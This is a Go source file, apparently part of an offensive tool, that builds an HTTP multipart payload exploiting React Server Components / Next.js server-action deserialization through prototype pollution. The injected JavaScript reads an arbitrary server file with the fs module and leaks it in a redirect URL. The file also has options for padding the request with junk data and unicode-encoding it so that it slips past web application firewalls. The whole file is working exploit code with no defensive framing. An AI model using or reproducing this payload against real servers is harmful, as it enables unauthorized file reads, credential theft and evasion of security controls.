package payload

import (
	"encoding/json"
	"fmt"
	"strings"
)

type FileReadBuilder struct {
	filepath         string
	wafBypass        bool
	wafBypassSizeKB  int
	unicodeEncode    bool
}

func NewFileReadBuilder() *FileReadBuilder {
	return &FileReadBuilder{
		wafBypassSizeKB: 128,
	}
}

func (b *FileReadBuilder) SetFilePath(path string) *FileReadBuilder {
	b.filepath = path
	return b
}

func (b *FileReadBuilder) SetWAFBypass(bypass bool, sizeKB int) *FileReadBuilder {
	b.wafBypass = bypass
	if sizeKB > 0 {
		b.wafBypassSizeKB = sizeKB
	}
	return b
}

func (b *FileReadBuilder) SetUnicodeEncode(encode bool) *FileReadBuilder {
	b.unicodeEncode = encode
	return b
}

func (b *FileReadBuilder) Build() Payload {
	escapedPath := strings.ReplaceAll(b.filepath, "'", "\\'")

	prefixPayload := fmt.Sprintf(
		"var res=process.mainModule.require('fs')"+
			".readFileSync('%s','utf-8');"+
			"throw Object.assign(new Error('NEXT_REDIRECT'),"+
			"{digest: `NEXT_REDIRECT;push;/exploit?out=${encodeURIComponent(res)};307;`});",
		escapedPath,
	)

	part0Data := map[string]interface{}{
		"then":   "$1:__proto__:then",
		"status": "resolved_model",
		"reason": -1,
		"value":  "{\"then\":\"$B1337\"}",
		"_response": map[string]interface{}{
			"_prefix":   prefixPayload,
			"_chunks":   "$Q2",
			"_formData": map[string]string{"get": "$1:constructor:constructor"},
		},
	}

	part0JSON, _ := json.Marshal(part0Data)
	part0 := string(part0JSON)

	if b.unicodeEncode {
		part0 = encodeUnicode(part0)
	}

	var parts []string

	if b.wafBypass {
		paramName, junk := generateJunkData(b.wafBypassSizeKB)
		parts = append(parts, fmt.Sprintf(
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
				"Content-Disposition: form-data; name=\"%s\"\r\n\r\n"+
				"%s\r\n",
			paramName, junk,
		))
	}

	parts = append(parts,
		fmt.Sprintf("------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"0\"\r\n\r\n"+
			"%s\r\n", part0),
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"1\"\r\n\r\n"+
			"\"$@0\"\r\n",
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"2\"\r\n\r\n"+
			"[]\r\n",
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
	)

	return Payload{
		Body:        strings.Join(parts, ""),
		ContentType: "multipart/form-data; boundary=" + boundary,
	}
}

